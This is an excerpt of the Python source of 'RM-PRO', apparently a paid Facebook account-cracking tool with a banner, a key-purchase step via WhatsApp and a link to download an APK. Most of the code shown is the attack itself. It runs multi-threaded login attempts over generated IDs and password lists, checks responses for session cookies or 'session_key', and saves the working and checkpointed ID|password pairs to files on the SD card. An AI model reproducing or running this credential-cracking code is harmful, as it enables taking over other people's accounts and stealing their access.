...
logo=("""\033[1;37m
  33[0;91m _____   __  __ 
\33[0;91m |  __ \ |  \/  |.        \033[1;34m𝐏 \033[1;37m
\33[0;91m | |__) || \  / |
\33[0;91m |  _  / | |\/| |.          \033[1;31m 𝐑\033[1;37m
\33[0;91m | | \ \ | |  | |
\33[0;91m |_|  \_\|_|  |_|.          \033[1;35m𝐎 \033[1;37m
----------------------------------------------
 Author    :  RAHAD + MAHOBIN
 Github    : RM110
 Facebook  : MR.RM.GANG
 Tool Name : RM-PRO
 Type type : PAID
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/RM_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi RM Sir, I Need To Buy Your Paid RM PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python RM.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as RM:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [RM-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        RM=session.cookies.get_dict().keys()
                        if "c_user" in RM:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [RM-OK] %s | %s'%(ids,pas))
                                open('/sdcard/RM-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RM:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [RM-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [RM-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/RM-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [RM-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/RM-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [RM-OK] '+uid+' | '+pas+'\033[1;97m')
